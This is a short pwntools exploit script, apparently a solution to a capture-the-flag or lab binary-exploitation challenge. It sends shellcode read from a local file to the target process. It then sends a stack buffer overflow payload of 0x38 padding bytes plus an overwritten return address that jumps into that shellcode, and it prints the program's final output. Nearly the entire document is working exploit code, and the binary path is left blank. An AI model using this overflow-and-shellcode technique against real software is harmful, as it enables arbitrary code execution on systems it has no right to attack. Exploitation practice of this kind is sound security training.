#!/usr/bin/python3
from pwn import *

'''
Return address = 0x1b2af000
'''

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb = '''
set disassembly-flavor intel
display/8i $rip
display/x $rbp
display/x $rsp
display/x $rax
break *challenge+0x2bb
break _exit
c
'''

p = process()
#p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])

with open("./shelltext", "rb") as f:
    shellcode = f.read()
shellcode = bytes(shellcode)

p.recv()
p.sendline(shellcode)
print(p.recvuntil(b"size: ").decode())

shellcode = bytes.fromhex("41" * int("0x38", 16))
shellcode += p64(0x14695000)
size = bytes(str(int(len(shellcode))),encoding="utf-8")
print("[!] Size:", size)

p.sendline(size)
p.recv()
p.sendline(shellcode)
p.recvuntil(b"Goodbye!")
print(p.recv().split(b"\n")[-2].decode())
